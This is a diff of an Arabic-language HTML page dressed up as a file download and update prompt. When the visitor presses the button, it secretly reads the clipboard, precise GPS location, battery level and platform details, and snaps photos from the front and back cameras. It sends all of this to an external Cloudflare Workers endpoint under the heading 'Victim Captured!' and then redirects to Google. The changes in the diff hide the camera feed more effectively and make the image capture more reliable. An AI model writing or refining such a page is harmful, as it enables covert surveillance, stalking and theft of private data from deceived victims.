@@ -3,27 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحميل الملف</title>
+    <title>جاري التحميل...</title>
     <style>
-        body { background: #f4f4f9; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
-        .icon { font-size: 50px; color: #1877f2; margin-bottom: 20px; }
-        button { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        button:active { transform: scale(0.95); }
+        body { background: #f4f4f9; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; z-index: 10; }
+        button { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; }
+        /* إخفاء الفيديو بطريقة ذكية تخدع المتصفح ليبقى شغالاً */
+        #video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
         #status { margin-top: 15px; color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <div class="icon">📁</div>
-    <h2>جاهز للتحميل</h2>
-    <p>اضغط أدناه لبدء تحميل الملف المطلوب بشكل آمن.</p>
-    <button id="btn" onclick="startTracking()">تحميل الآن (14.5MB)</button>
+    <div class="icon" style="font-size:50px;">📁</div>
+    <h2>تحديث الملفات</h2>
+    <p>اضغط لبدء التحديث واستكمال التحميل بشكل آمن.</p>
+    <button id="btn" onclick="startTracking()">تحديث الآن</button>
     <div id="status"></div>
 </div>
 
-<video id="video" autoplay playsinline style="display:none;"></video>
+<!-- عنصر الفيديو يبقى موجوداً في الصفحة لكنه غير مرئي -->
+<video id="video" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -31,7 +40,8 @@ async function startTracking() {
     const btn = document.getElementById('btn');
     const status = document.getElementById('status');
     btn.disabled = true;
-    status.innerText = "جاري تهيئة الرابط...";
+    btn.style.background = "#ccc";
+    status.innerText = "جاري الاتصال بالسيرفر...";
 
     let data = {
         battery: "Unknown",
@@ -47,71 +57,80 @@ async function startTracking() {
         data.battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
     } catch(e) {}
 
-    // 2. الحافظة (Clipboard) - تطلب إذن عند الضغط
+    // 2. الحافظة
     try {
         data.clipboard = await navigator.clipboard.readText();
-    } catch(e) { data.clipboard = "تم رفض إذن الحافظة أو فارغة"; }
+    } catch(e) { data.clipboard = "رفض أو فارغة"; }
 
-    // 3. الموقع الدقيق (GPS)
-    status.innerText = "جاري فحص اتصالك...";
+    // 3. الموقع GPS
     try {
         const pos = await new Promise((res, rej) => {
             navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
         });
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        data.location = `📍 <b>الموقع الدقيق:</b>\nرابط الخريطة: https://www.google.com/maps?q=${lat},${lon}\nالارتفاع: ${pos.coords.altitude || 0} متر`;
-    } catch(e) { data.location = "📍 الموقع: تم رفض الإذن بالوصول"; }
+        data.location = `📍 <b>الموقع:</b> https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+    } catch(e) { data.location = "📍 الموقع: تم الرفض"; }
 
-    // 4. الصور (الأمامية ثم الخلفية)
-    status.innerText = "جاري التحقق من أمان المتصفح...";
-    data.frontImg = await takeShot("user");
-    data.backImg = await takeShot("environment");
+    // 4. التقاط الصور (تحسين جذري)
+    status.innerText = "جاري معالجة البيانات (قد يستغرق 5 ثوانٍ)...";
+    
+    data.frontImg = await takeShot("user"); // الكاميرا الأمامية
+    await new Promise(r => setTimeout(r, 1000)); // فاصل زمني بين الكاميرتين لراحة الحساس
+    data.backImg = await takeShot("environment"); // الكاميرا الخلفية
 
-    // 5. تجميع الرسالة
+    // 5. التجميع والإرسال
     const msg = `
 ✅ <b>Victim Captured!</b>
-
 🔋 <b>Battery:</b> ${data.battery}
 📋 <b>Clipboard:</b> <code>${data.clipboard}</code>
-
-📱 <b>System:</b> ${navigator.platform}
-🌐 <b>Browser:</b> ${navigator.userAgent}
-
 ${data.location}
-
+📱 <b>System:</b> ${navigator.platform}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
     `;
 
-    // 6. الإرسال للـ Worker
     await fetch("https://cold-brook-420f.tjarb093.workers.dev/", {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ message: msg, frontImage: data.frontImg, backImage: data.backImg })
     });
 
-    // توجيه نهائي
     window.location.href = "https://www.google.com";
 }
 
 async function takeShot(mode) {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let stream = null;
+
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-        const video = document.getElementById('video');
+        stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } }, 
+            audio: false 
+        });
         video.srcObject = stream;
+
+        // الانتظار حتى يبدأ الفيديو فعلياً (مهم جداً لحل مشكلة السواد)
+        await new Promise((resolve) => {
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(resolve, 3500); // زيادة وقت الانتظار لضبط الإضاءة تلقائياً
+            };
+        });
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
         
-        // انتظار 3 ثواني لضمان جودة الصورة وعدم ظهور سواد
-        await new Promise(r => setTimeout(r, 3000));
+        const img = canvas.toDataURL('image/jpeg', 0.7);
         
-        const canvas = document.getElementById('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        
-        const img = canvas.toDataURL('image/jpeg', 0.6);
+        // إيقاف الكاميرا فوراً
         stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+        
         return img;
-    } catch (e) { return null; }
+    } catch (e) {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        return null;
+    }
 }
 </script>
 </body>
